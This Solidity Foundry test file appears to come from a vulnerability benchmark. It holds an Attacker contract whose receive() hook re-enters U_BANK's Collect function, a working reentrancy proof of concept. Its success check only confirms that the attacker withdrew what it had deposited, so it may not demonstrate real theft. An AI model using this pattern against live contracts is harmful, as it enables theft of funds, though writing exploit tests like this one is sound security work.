
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    
    U_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new U_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinSum is 2 ether. We need to deposit at least 2 ether to withdraw.
        // To demonstrate reentrancy successfully without reverting due to underflow in 0.8.x,
        // we will deposit 2 * attackVal and withdraw attackVal twice.
        // This bypasses the MinSum check on the second withdrawal if (balance - attackVal) < MinSum.
        vm.assume(attackVal >= 1 ether); 
        vm.assume(attackVal <= 50 ether); 

        uint256 depositAmount = attackVal * 2;

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state needed here, handled in setupAttack.

        // --- 3. Funding ---
        // Fund the Victim (ensure it has enough ETH)
        vm.deal(address(_contractUnderTest), depositAmount + 1 ether); 
        
        // Fund the Test Contract to pass to attacker
        vm.deal(address(this), depositAmount);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: depositAmount}(depositAmount);
        
        // U_BANK logic: Put(0) sets unlockTime = block.timestamp.
        // Collect requires block.timestamp > unlockTime.
        vm.warp(block.timestamp + 100);

        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        victim = U_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Deposit funds to satisfy balance checks
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;
        amountToWithdraw = val;

        // 2. Call the vulnerable function.
        victim.Collect(val);

        // 3. Verify Success Conditions.
        // If we re-entered successfully, we withdrew 'val' twice.
        if (address(this).balance >= initialSnapshot + (2 * val)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(amountToWithdraw);
        }
    }
}
